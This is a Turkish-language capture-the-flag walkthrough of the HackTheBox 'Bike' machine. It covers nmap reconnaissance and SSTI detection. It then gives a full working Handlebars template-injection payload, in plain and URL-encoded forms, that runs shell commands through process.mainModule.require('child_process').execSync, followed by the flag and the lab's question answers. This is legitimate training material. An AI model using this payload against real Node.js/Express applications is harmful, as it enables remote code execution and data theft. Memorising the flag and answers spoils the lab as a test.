# HackTheBox — Bike Writeup

**Zorluk:** Easy
**İşletim Sistemi:** Linux
**Hedef IP:** 10.129.184.197

---

## 1. Keşif (Reconnaissance)

Standart prosedürüm gereği ilk adım her zaman kapsamlı bir Nmap taraması. Tüm portları tarayıp servis/versiyon ve OS tespiti alıyorum:

```bash
nmap -sS -A -p- -T5 10.129.184.197
```

**Çıktı:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Sonuç olarak hedefte **2 adet TCP portu** açık: **22 (SSH)** ve **80 (HTTP)**. Nmap'in servis tespiti HTTP portunda ilginç bir detay veriyor: `Node.js (Express middleware)` — yani karşımızda bir Express.js backend'i var. Bu bilgiyi not ediyorum, ileride işime yarayacak.

---

## 2. Web Uygulamasının İncelenmesi

Tarayıcıdan `http://10.129.184.197` adresine gidiyorum. Sayfa başlığı "Bike" olan basit bir kurumsal/tanıtım sitesi karşılıyor beni. Sayfada dikkatimi çeken şey bir **e-posta input alanı** — muhtemelen bir iletişim/bültene kayıt formu.

Ayrıca tarayıcı eklentim (Wappalyzer) ile teknoloji yığınına bakıyorum. Backend tarafında **Express** framework'ünün kullanıldığını doğruluyorum. Bu, Nmap'in zaten verdiği "Express middleware" bilgisiyle tutarlı.

Kullanıcıdan veri alan bir input alanı ve backend'in Node.js/Express olması, benim aklıma direkt **Server-Side Template Injection (SSTI)** ihtimalini getiriyor. Node.js ekosisteminde en yaygın template motorları arasında Handlebars, EJS, Pug gibi seçenekler var; bunların input sanitizasyonu düzgün yapılmazsa SSTI'ye açık hâle gelebiliyorlar.

---

## 3. SSTI Zafiyetinin Tespiti

Klasik SSTI test payload'ı olan `{{7*7}}` ifadesini e-posta input alanına giriyorum ve isteği gönderiyorum.

**Payload:**
```
{{7*7}}
```

Sunucudan gelen cevap gayet konuşkan — tam bir stack trace ile karşılaşıyorum:

```
0 "Error: Parse error on line 1:"
1 "{{7*7}}"
2 "--^"
3 "Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'"
4 " at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)"
5 " at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)"
6 " at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)"
7 " at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)"
8 " at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)"
9 " at router.post (/root/Backend/routes/handlers.js:15:18)"
10 " at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)"
11 " at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)"
12 " at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)"
13 " at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)"
```

Hata mesajı her şeyi ele veriyor: `handlebars/dist/cjs/handlebars/compiler/parser.js` — backend, template motoru olarak **Handlebars** kullanıyor ve girdiğim `{{7*7}}` doğrudan template parser'ına gidip parse hatasına sebep olmuş. Bu, klasik bir **SSTI (Server-Side Template Injection)** doğrulamasıdır: kullanıcı girdisi sanitize edilmeden template içine enjekte ediliyor.

Ayrıca hata mesajındaki dosya yolundan sunucudaki backend kodunun `/root/Backend/` dizininde çalıştığını da öğrenmiş oluyorum — bu bilgi de ileride işime yarayacak.

---

## 4. RCE'ye Giden Yol — Handlebars SSTI İstismarı

Handlebars, tasarım gereği "logic-less" (mantıksız) bir template motoru olduğu için doğrudan `{{7*7}}` gibi ifadeleri desteklemiyor. Ancak Handlebars'ın bazı zayıf noktaları literatürde iyi bilinen bir konu. HackTricks üzerindeki Handlebars SSTI bölümünden, Handlebars'ın `constructor` zincirini kötüye kullanarak JavaScript native fonksiyonlarına (`Function` constructor'ı) erişim sağlayan ve nihayetinde `require`'a ulaşan bir bypass payload'ı buluyorum. Bu tür payload'lar genellikle özel karakterler (`{`, `}`, `#`, `|` vb.) içerdiği için ham hâlde göndermek sorun çıkarabiliyor; bu yüzden isteği **Burp Suite**'in **Decoder** sekmesinde **URL Encode** ederek göndermem gerekiyor.

### 4.1. İlk deneme

URL-encode edilmiş hâliyle gönderdiğim payload:

```
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```

Bu payload'ı decode ettiğimizde okunabilir hâli şu şekilde:

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

İsteği Burp Suite'te yakalayıp bu şekilde gönderiyorum. Ancak cevap olarak şu hatayı alıyorum:

```
ReferenceError: require is not defined
```

Bu hata çok kritik bir ipucu veriyor: **`require`** fonksiyonu, standart Node.js modüllerinde her dosyada otomatik olarak tanımlı olsa da, Handlebars'ın çalıştırdığı `Function` constructor context'inde **tanımsız (undefined)** kalıyor. Çünkü `new Function()` ile oluşturulan kod, dosya bazlı module scope'undan bağımsız çalışır ve Node.js'in her modüle özel enjekte ettiği `require`, `module`, `__dirname` gibi değişkenlere sahip değildir.

### 4.2. Payload'ın düzeltilmesi

Bu sorunun bilinen çözümü, `require`'a doğrudan değil, global olarak her zaman erişilebilen **`process`** nesnesi üzerinden ulaşmak: `process.mainModule.require(...)`. `process`, Node.js'te gerçek anlamda global scope'a bağlı olan (top-level scope'a ait) bir nesne olduğu için `Function` constructor context'inden de erişilebiliyor.

Payload'ı güncelliyorum:

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Bunu tekrar Burp'te URL-encode edip gönderiyorum. Bu sefer cevap tam istediğim gibi geliyor:

```
We will contact you at:       e
2
[object Object]
  function Function() { [native code] }
  2
  [object Object]
      root
```

En sondaki satırda **`root`** yazıyor — yani `whoami` komutunun çıktısı bu. Web sunucusu (Express uygulaması) **root kullanıcısı** olarak çalışıyormuş. Bu ciddi bir yanlış yapılandırma; normalde web servisleri düşük yetkili bir kullanıcıyla (örn. `www-data`, `node`) çalıştırılmalı.

---

## 5. Komut Çalıştırma ve Flag'in Ele Geçirilmesi

Artık `execSync` ile keyfi komut çalıştırabildiğime göre, root kullanıcısının ana dizinindeki flag dosyasını okumayı deniyorum. Payload'daki komutu değiştiriyorum:

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

URL-encode edilmiş hâli:

```
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.push%20(lookup%20string.sub%20%22constructor%22)%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%22return%20process.mainModule.require(%27child_process%27).execSync(%27cat%20%2Froot%2Fflag.txt%27).toString()%3B%22%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20(string.sub.apply%200%20codelist)%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D
```

Bu isteği Burp Suite üzerinden gönderiyorum. Cevap olarak şunu alıyorum:

```html
<p class="result">
    We will contact you at:       e
  2
  [object Object]
    function Function() { [native code] }
    2
    [object Object]
        6b258d726d287462d60c103d0142a81c
</p>
```

Response içinde flag'i başarıyla görüyorum. 🎉

---

## 6. Özet — Atak Zinciri

1. Nmap taramasıyla 22 (SSH) ve 80 (HTTP) portlarının açık olduğu tespit edildi; HTTP portunda Node.js/Express çalıştığı belirlendi.
2. Web sayfasındaki e-posta input alanına `{{7*7}}` payload'ı gönderilerek stack trace üzerinden **Handlebars** template motorunun kullanıldığı ve **SSTI** zafiyeti doğrulandı.
3. HackTricks'teki Handlebars SSTI bypass payload'ı Burp Suite Decoder ile URL-encode edilerek gönderildi.
4. İlk denemede `require is not defined` hatası alındı; bunun sebebinin `require`'ın Function constructor scope'unda tanımlı olmaması olduğu anlaşıldı.
5. Payload, `require` yerine top-level scope'a bağlı **`process`** nesnesi üzerinden (`process.mainModule.require(...)`) çalışacak şekilde güncellendi ve RCE elde edildi.
6. `whoami` komutuyla web sunucusunun **root** yetkisiyle çalıştığı tespit edildi.
7. `cat /root/flag.txt` komutu çalıştırılarak flag response içinde okundu.

---

## 7. Görev Soruları ve Cevapları

**Görev 1 — Nmap hangi TCP portlarını açık olarak tanımlıyor? Portları virgülle ayırarak ve aralarında boşluk bırakmadan, düşükten yükseğe doğru bir liste halinde yanıtlayın.**
22,80

**Görev 2 — Birinci soruda belirtilen http/web portunda dinleme yapan hizmeti hangi yazılım çalıştırıyor?**
Node.js

**Görev 3 — Wappalyzer'a göre Web Framework'ün adı nedir?**
Express

**Görev 4 — Gönderdiğimiz komutla test ettiğimiz güvenlik açığının adı nedir `{{7*7}}`?**
Server-Side Template Injection (SSTI)

**Görev 5 — Node.JS'de kullanılan şablonlama motoru nedir?**
Handlebars

**Görev 6 — BurpSuite'te metni kodlamak için kullanılan sekmenin adı nedir?**
Decoder

**Görev 7 — HTTP isteğinde veri paketimize özel karakterler eklemek için veri paketini kodlayacağız. Peki hangi kodlama türünü kullanacağız?**
URL Encoding

**Görev 8 — HackTricks'ten gelen bir yükü kullanarak sistem komutlarını çalıştırmaya çalıştığımızda bir hata alıyoruz. Yanıt hatasında "tanımlanmamış" olan nedir?**
`require`

**Görev 9 — Node.JS'de en üst düzey kapsamın (top-level scope) adı hangi değişkene verilir?**
`process`

**Görev 10 — Bu güvenlik açığından yararlanarak, web sunucusunun çalıştığı kullanıcı olarak komut yürütme olanağı elde ediyoruz. Bu kullanıcının adı nedir?**
root

**Tek Bayrak Gönder — Kök kullanıcının ana dizininde bulunan bayrağı gönderin.**
`6b258d726d287462d60c103d0142a81c`

---

*Not: Bu writeup eğitim/CTF amaçlıdır. Tüm işlemler yalnızca HackTheBox'ın izin verdiği laboratuvar ortamında gerçekleştirilmiştir.*
